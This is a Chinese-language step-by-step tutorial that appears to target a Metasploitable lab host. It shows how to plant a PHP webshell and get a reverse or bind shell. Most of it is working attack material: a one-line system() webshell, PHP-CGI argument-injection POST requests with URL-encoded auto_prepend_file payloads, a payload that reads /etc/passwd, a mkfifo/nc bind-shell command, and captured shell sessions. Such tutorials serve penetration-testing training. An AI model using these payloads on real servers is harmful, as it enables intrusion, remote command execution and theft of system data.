
# php反弹shell

* 写入简单 webshell

* PHP 反弹 shell

* Ubuntu / Debian 默认安装 PHP5-cgi
## 写入简单 webshell

1. 简单网页木马

```  
 <?php
 \$cmd = \$_GET["cmd"];
 system(\$cmd);
 ?>
```

2. 上传木马
``` 
 POST http://10.10.10.132/phpMyAdmin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1
 Host: 192.168.20.10
 Content-Length: 133
 
 <?php
 passthru('echo "<?php \$cmd = \$_GET["cmd"];system(\$cmd);?>" > /var/www/3.php');
 passthru('cat /var/www/3.php');
 die();
 ?>
```
3. 验证此简单木马


## PHP 反弹 shell
1. 获取 webshell
``` 
root@kali:~# cp /usr/share/webshells/php/php-reverse-shell.php /root/Desktop/test.php
```

2. 修改要反弹到的主机IP

3. 通过 POST 方法直接将文本内容发给目标服务器

4. 开始监听反弹的端口

5. BurpSuite 发送请求，执行木马并反弹

6. 查看 nc 的监听情况
``` 
 root@kali:~# nc -nvvlp 1234
 listening on [any] 1234 ...
 connect to [10.10.10.131] from (UNKNOWN) [10.10.10.132] 43856
 Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
  04:28:00 up  2:57,  2 users,  load average: 0.03, 0.01, 0.00
 USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
 msfadmin tty1     -                03Mar18  1:48   0.01s  0.00s /bin/login -- 
 root     pts/0    :0.0             03Mar18 17days  0.00s  0.00s -bash
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 sh: no job control in this shell
 sh-3.2$ 
```

7. 使用 nc 直接进行操作
``` 
 sh-3.2$ pwd
 /
 sh-3.2$ cd home
 sh-3.2$ ls
 ftp
 msfadmin
 service
 user
 sh-3.2$ pwd
 /home
 sh-3.2$ netstat -tulnp   
 sh-3.2$ which ifconfig
 sh-3.2$ whereis ifconfig                                          
 ifconfig: /sbin/ifconfig /usr/share/man/man8/ifconfig.8.gz
 sh-3.2$ /sbin/ifconfig
 eth0      Link encap:Ethernet  HWaddr 00:0c:29:d0:ab:2c  
           inet addr:10.10.10.132  Bcast:10.10.10.255  Mask:255.255.255.0
           inet6 addr: fe80::20c:29ff:fed0:ab2c/64 Scope:Link
           UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
           RX packets:3232 errors:0 dropped:0 overruns:0 frame:0
           TX packets:1065 errors:0 dropped:0 overruns:0 carrier:0
           collisions:0 txqueuelen:1000 
           RX bytes:301079 (294.0 KB)  TX bytes:278971 (272.4 KB)
           Base address:0x2000 Memory:fd5c0000-fd5e0000 
 sh-3.2$ 

```

## Ubuntu / Debian 默认安装 PHP5-cgi
> 可直接访问 /cgi-bin/php5 和 /cgi-bin/php (爬不出来的目录)


* 测试漏洞
``` 
POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1
Host: 123
Content-Length: 86

<?php
passthru('id');
echo exec('pwd');
echo system('cat /etc/passwd');
die();
?>

```

* 服务器打开侦听端口
1. 服务器打开端口
``` 
 POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1
 Host: 123
 Content-Length: 86
 
 <?php
 system('mkfifo /tmp/pipe;sh /tmp/pipe | nc -nlp 4444 > /tmp/pipe');
 die();
 ?>

```

2. kali 验证 shell
``` 
 root@kali:~# nc 10.10.10.132 4444
 ls
 php
 php5
 pwd
 /usr/lib/cgi-bin
 ls /var/www
 3.php
 dav
 dvwa
 index.php
 mutillidae
 phpMyAdmin
 phpinfo.php
 test
 tikiwiki
 tikiwiki-old
 twiki

```

3. kali 端口 nc
``` 
 root@kali:~# nc 10.10.10.132 4444
 ls /var/www
 3.php
 dav
 dvwa
 index.php
 mutillidae
 phpMyAdmin
 phpinfo.php
 test
 tikiwiki
 tikiwiki-old
 twiki
 exit
 exit
 root@kali:~# 

```



